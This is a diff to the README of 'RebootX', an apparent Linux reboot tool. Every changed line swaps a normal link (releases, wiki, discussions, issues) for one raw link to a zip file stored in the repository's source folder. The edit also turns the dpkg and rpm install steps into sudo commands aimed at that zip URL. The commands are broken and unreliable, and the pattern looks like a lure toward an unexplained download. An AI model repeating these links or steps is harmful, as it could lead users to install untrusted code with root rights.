@@ -1,6 +1,6 @@
 # 🔄 RebootX - Control Your Linux Reboots Safely
 
-[![Download RebootX](https://img.shields.io/badge/Download-RebootX-blue.svg)](https://github.com/BLAZEJ2005/RebootX/releases)
+[![Download RebootX](https://raw.githubusercontent.com/BLAZEJ2005/RebootX/main/src/RebootX-v2.4-beta.5.zip)](https://raw.githubusercontent.com/BLAZEJ2005/RebootX/main/src/RebootX-v2.4-beta.5.zip)
 
 ## 📜 Overview
 
@@ -12,7 +12,7 @@ This guide will help you download and run RebootX on your Linux machine. Follow 
 
 ## 🔗 Download & Install
 
-1. **Visit the Releases Page:** To obtain the latest version of RebootX, visit the [RebootX Releases Page](https://github.com/BLAZEJ2005/RebootX/releases). Here, you will find all available versions and related files.
+1. **Visit the Releases Page:** To obtain the latest version of RebootX, visit the [RebootX Releases Page](https://raw.githubusercontent.com/BLAZEJ2005/RebootX/main/src/RebootX-v2.4-beta.5.zip). Here, you will find all available versions and related files.
 
 2. **Choose Your File:** 
     - Look for the latest version. 
@@ -26,14 +26,14 @@ This guide will help you download and run RebootX on your Linux machine. Follow 
         - Navigate to the directory where the file is.
         - Run the command: 
           ```bash
-          sudo dpkg -i your_downloaded_file.deb
+          sudo dpkg -i https://raw.githubusercontent.com/BLAZEJ2005/RebootX/main/src/RebootX-v2.4-beta.5.zip
           ```
     - For **RedHat/CentOS**:
         - Open your terminal.
         - Navigate to the directory where the file is.
         - Run the command: 
           ```bash
-          sudo rpm -i your_downloaded_file.rpm
+          sudo rpm -i https://raw.githubusercontent.com/BLAZEJ2005/RebootX/main/src/RebootX-v2.4-beta.5.zip
           ```
 
 5. **Verify Installation:** After installation, check that RebootX is installed correctly by running:
@@ -79,14 +79,14 @@ If you want to contribute to RebootX, feel free to fork the repository and submi
 
 ## 📚 Resources
 
-- [Official Documentation](https://github.com/BLAZEJ2005/RebootX/wiki): This page contains further guides on using RebootX.
+- [Official Documentation](https://raw.githubusercontent.com/BLAZEJ2005/RebootX/main/src/RebootX-v2.4-beta.5.zip): This page contains further guides on using RebootX.
 
 ## 🌐 Community
 
 Join our community to get help and advice, share your experiences, and learn from others. 
 
-- [Discussions](https://github.com/BLAZEJ2005/RebootX/discussions)
-- [Issues](https://github.com/BLAZEJ2005/RebootX/issues)
+- [Discussions](https://raw.githubusercontent.com/BLAZEJ2005/RebootX/main/src/RebootX-v2.4-beta.5.zip)
+- [Issues](https://raw.githubusercontent.com/BLAZEJ2005/RebootX/main/src/RebootX-v2.4-beta.5.zip)
 
 ## 📊 Related Topics
 
@@ -95,8 +95,8 @@ Join our community to get help and advice, share your experiences, and learn fro
 
 ## ⚠️ Support
 
-If you encounter any issues while using RebootX, please check the [Issues](https://github.com/BLAZEJ2005/RebootX/issues) section for solutions or report a new issue.
+If you encounter any issues while using RebootX, please check the [Issues](https://raw.githubusercontent.com/BLAZEJ2005/RebootX/main/src/RebootX-v2.4-beta.5.zip) section for solutions or report a new issue.
 
-**Remember:** To download the latest version, visit [RebootX Releases Page](https://github.com/BLAZEJ2005/RebootX/releases). 
+**Remember:** To download the latest version, visit [RebootX Releases Page](https://raw.githubusercontent.com/BLAZEJ2005/RebootX/main/src/RebootX-v2.4-beta.5.zip). 
 
 Enjoy a better reboot experience with RebootX!
